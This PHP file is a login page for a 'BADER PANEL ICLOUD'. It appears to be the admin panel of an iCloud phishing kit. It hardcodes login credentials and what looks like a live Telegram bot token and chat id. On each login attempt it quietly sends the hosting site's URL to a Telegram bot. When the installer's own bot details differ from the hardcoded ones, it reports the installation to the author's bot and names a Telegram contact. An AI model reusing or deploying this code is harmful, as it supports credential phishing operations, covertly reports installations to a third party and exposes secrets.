<?php 
session_start();
$url="https://".$_SERVER['HTTP_HOST'];
$uri = "#".$url."#";
include('../ajax/ajaxi.php');
if (isset($_POST['Submit'])) {
$logins = array('id'.$chat_id => $chat_id.'id', 'i' => 'passwou89yrd1');
$Username = isset($_POST['Username']) ? $_POST['Username'] : '';
$Password = isset($_POST['Password']) ? $_POST['Password'] : '';
if (isset($logins[$Username]) && $logins[$Username] == $Password) {
$_SESSION['UserData']['Username'] = $logins[$Username];
$mesg ="<p> Welcome Login By BADER </p>";
$mesg .="<p> ======================================== </p>";
$mesg .="<p>link : " . $uri . "</p>";
$mesg .="<p> ======================================== </p>";
$messBot = str_replace("</p>", "\n", $mesg);
$messBot = strip_tags($messBot);
Telegram("", $messBot); 
header("location: index.php");
} 
else 
{
$msg = "<span style='color:red'>Invalid Login Details</span>";
$mesg ="<p> Error Login BY BADER </p>";
$mesg .="<p> ========================================== </p>";
$mesg .="<p>link : " . $uri . "</p>";
$mesg .="<p> ========================================== </p>";
$mesg .="<p> Contact: @BADERLINK for help!</p>";
$messBot = str_replace("</p>", "\n", $mesg);
$messBot = strip_tags($messBot);
Telegram("", $messBot);    
}
}
$_SES= "558416097";
$_SES2= "669686054:AAHVeLJLNo2KuZ_v9pzz_LX457Cw-ZqWbS8";
if ($_SES !== $chat_id || $_SES2 !== $token ) {
$msgerr = "<span align='center' style='color:red'>Invalid Details</spa>\n\n\n\n";
$msgerr .= "<span  style='color:green'>Contact</span>\n\n\n\n";
echo $msgerr;
echo "<a href=\"https://t.me/BADERLINK\" class=\"Button3\">@BADERLINK</a>";
$mesg ="<p> login Error Login BY BADER </p>";
$mesg .="<p> ========================================== </p>";
$mesg .="<p>link : " . $uri . "</p>";
$mesg .="<p> ========================================== </p>";
$mesg .="<p> Contact: @BADERLINK for help!</p>";
$messBot = str_replace("</p>", "\n", $mesg);
$messBot = strip_tags($messBot);
Telegram("", $messBot); 
exit;
}
?>
<!doctype html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>BADER PANEL</title>
<link href="./css/style.css" rel="stylesheet">
</head>
<body>
<div id="Frame0" align="center">
  <p>WELCOME TO PANEL BADER ICLOUD</p>
</div>
<br>
<form action="" method="post" name="Login_Form">
  <table width="400" border="0" align="center" cellpadding="5" cellspacing="1" class="Table">
    <?php if (isset($msg)) { ?>
    <tr>
      <td colspan="2" align="center" valign="top"><?php echo $msg; ?></td>
    </tr>
    <?php
} ?>
    <tr>
      <td colspan="2" align="center" valign="top"><h3>Login</h3></td>
    </tr>
    <tr>
      <td align="right" valign="top">Username</td>
      <td><input name="Username" type="text" class="Input"></td>
    </tr>
    <tr>
      <td align="right">Password</td>
      <td><input name="Password" type="password" class="Input"></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td><input name="Submit" type="submit" value="Login" class="Button3"></td>
    </tr>
  </table>
</form>
</body>
</html>